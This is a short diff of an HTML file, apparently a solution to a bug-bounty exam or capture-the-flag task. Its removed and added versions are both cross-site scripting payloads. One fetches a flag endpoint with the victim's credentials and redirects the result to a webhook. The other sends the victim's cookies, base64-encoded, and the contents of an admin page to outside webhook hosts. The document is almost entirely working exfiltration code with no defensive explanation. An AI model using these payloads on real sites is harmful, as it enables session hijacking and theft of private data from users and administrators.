@@ -1,9 +1,16 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <img src="x" onerror="
-      fetch('https://api-bugbounty-exam.hashacademy.co/api/flag', {credentials:'include'})
-      .then(r=>r.text())
-      .then(d=>location='https://webhooksite.net/74366b2e-d67d-466f-b06d-f011d3d7d349?flag='+encodeURIComponent(d))
-    ">
-  </body>
+<body>
+    <script>
+        // We attempt to fetch the admin's cookie and send it to your webhook
+        fetch("https://webhooksite.net/82f191e4-653a-4a2c-99d4-872bc4426e85/log?cookie=" + btoa(document.cookie));
+
+        // Alternative: If the flag is on the page text and not in a cookie
+        fetch("/admin/view/69e29e17bee6d6b7c6629c63") 
+            .then(response => response.text())
+            .then(data => {
+                fetch("https://your-webhook.site/log?page_content=" + btoa(data));
+            });
+    </script>
+</body>
 </html>
